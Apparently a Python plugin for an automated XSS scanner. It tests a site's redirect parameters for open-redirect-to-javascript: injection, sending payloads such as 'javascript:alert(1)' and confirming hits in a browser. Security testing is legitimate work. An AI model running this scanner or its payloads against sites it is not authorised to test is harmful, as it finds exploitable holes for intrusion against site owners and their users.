"""Open-redirect → javascript: XSS (v3 self-contained plugin)."""

from __future__ import annotations

import hashlib
import time
from typing import List
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from intellixss.http.client import HttpClient
from intellixss.models import InjectionContext, XSSFinding

REDIRECT_PARAMS = [
    "redirect",
    "next",
    "return",
    "returnUrl",
    "url",
    "goto",
    "dest",
    "destination",
    "continue",
    "r",
]

PAYLOADS = [
    "javascript:alert(1)",
    "javascript:alert`1`",
    "JaVaScRiPt:alert(1)",
]


def _set_param(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    q = dict(parse_qsl(p.query, keep_blank_values=True))
    q[param] = value
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(q), p.fragment))


async def scan_redirect_xss(
    client: HttpClient,
    url: str,
    *,
    browser=None,
    max_payloads: int = 3,
    log=None,
) -> List[XSSFinding]:
    log = log or (lambda *a, **k: None)
    findings: List[XSSFinding] = []

    # Params already in URL + common names
    existing = list(dict(parse_qsl(urlparse(url).query)).keys())
    params = list(dict.fromkeys(existing + REDIRECT_PARAMS))[:12]

    for param in params:
        canary = f"rd{hashlib.md5(f'{param}{time.time()}'.encode()).hexdigest()[:8]}"
        probe = _set_param(url, param, canary)
        st, body, hdrs, fin = await client.request("GET", probe)
        if st == 0:
            continue
        loc = (hdrs or {}).get("Location") or (hdrs or {}).get("location") or ""
        reflected = canary in (body or "") or canary in loc or canary in (fin or "")
        if not reflected:
            continue
        log(f"    [redirect] candidate param={param}", "info")

        for payload in PAYLOADS[:max_payloads]:
            attack = _set_param(url, param, payload)
            st2, body2, hdrs2, fin2 = await client.request("GET", attack)
            loc2 = (hdrs2 or {}).get("Location") or (hdrs2 or {}).get("location") or ""
            body2 = body2 or ""
            in_loc = "javascript:" in loc2.lower()
            in_body = "javascript:" in body2.lower() and payload.split(":")[0].lower() in body2.lower()
            if not (in_loc or in_body or payload in body2):
                continue

            finding = XSSFinding(
                url=fin2 or attack,
                parameter=param,
                method="GET",
                context=InjectionContext.HTML_ATTR_HREF,
                payload=payload,
                evidence=f"redirect_param reflected; location={loc2[:80]!r}",
                browser_confirmed=False,
                impact="high",
                vulnerability_type="open_redirect_xss",
                confidence=0.75,
            )

            if browser and browser.available:
                # Prefer final URL if body contains clickable js link; else attack URL
                confirm_url = fin2 or attack
                br = await browser.confirm(confirm_url, payload=payload)
                if br.confirmed:
                    finding.browser_confirmed = True
                    finding.confidence = 0.95
                    finding.evidence += f" | browser:{br.detail}"
                elif in_body and payload in body2:
                    # Try synthetic page with the href (same host navigation of attack URL)
                    br2 = await browser.confirm(attack, payload=payload)
                    if br2.confirmed:
                        finding.browser_confirmed = True
                        finding.confidence = 0.95
                        finding.evidence += f" | browser:{br2.detail}"

            findings.append(finding)
            log(
                f"    [VULN] redirect XSS param={param} browser={finding.browser_confirmed}",
                "vuln",
            )
            break
    return findings
